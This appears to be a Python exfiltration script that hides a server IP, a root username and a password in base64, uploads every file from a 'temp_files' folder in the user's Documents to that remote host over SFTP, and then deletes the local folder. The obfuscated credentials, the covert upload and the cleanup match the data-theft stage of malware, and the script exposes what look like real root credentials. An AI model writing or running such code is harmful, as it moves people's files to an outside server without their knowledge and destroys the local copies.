import base64
import paramiko
import os
import shutil

# Base64-encoded credentials and directory path
VPS_IP_ENC = b'NjQuMjI3LjEzNC41Mw=='  # Replace with your base64-encoded VPS IP
VPS_PORT_ENC = b'MjI='               # Base64-encoded port (22)
USERNAME_ENC = b'cm9vdA=='  # Base64-encoded username
PASSWORD_ENC = b'UmF3YWwuMjAwNUBSYWZheQ=='  # Base64-encoded password
DEST_DIR_ENC = b'L2ZpbGVz'  # Base64-encoded destination directory on VPS

# Decode the encoded values
def decode_config(encoded_value):
    return base64.b64decode(encoded_value).decode("utf-8")

# SFTP function to upload files to the VPS and clean up after transfer
def sftp_send():
    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Decode credentials
    vps_ip = decode_config(VPS_IP_ENC)
    vps_port = int(decode_config(VPS_PORT_ENC))
    username = decode_config(USERNAME_ENC)
    password = decode_config(PASSWORD_ENC)
    destination_dir = decode_config(DEST_DIR_ENC)

    # Get the temp_files directory path in the user's Documents folder
    temp_folder = os.path.join(os.environ["USERPROFILE"], "Documents", "temp_files")
    
    try:
        # Connect to the VPS
        ssh.connect(vps_ip, port=vps_port, username=username, password=password)
        sftp = ssh.open_sftp()

        # Traverse the temp_folder recursively
        for root, dirs, files in os.walk(temp_folder):
            # Construct the remote directory path
            relative_path = os.path.relpath(root, temp_folder)
            remote_path = os.path.join(destination_dir, relative_path).replace("\\", "/")

            # Create the remote directory if it doesn't exist
            try:
                sftp.chdir(remote_path)
            except IOError:
                sftp.mkdir(remote_path)
                print(f"Created remote directory: {remote_path}")
                sftp.chdir(remote_path)

            # Upload files in the current directory
            for filename in files:
                local_file = os.path.join(root, filename)
                remote_file = os.path.join(remote_path, filename).replace("\\", "/")
                sftp.put(local_file, remote_file)
                print(f"Transferred {filename} to {remote_file}")

        sftp.close()
        ssh.close()

        # Clean up local files after successful transfer
        shutil.rmtree(temp_folder)
        print(f"Deleted all files and folders in {temp_folder} after successful transfer.")

    except Exception as e:
        print(f"Error transferring files: {e}")

if __name__ == "__main__":
    sftp_send()
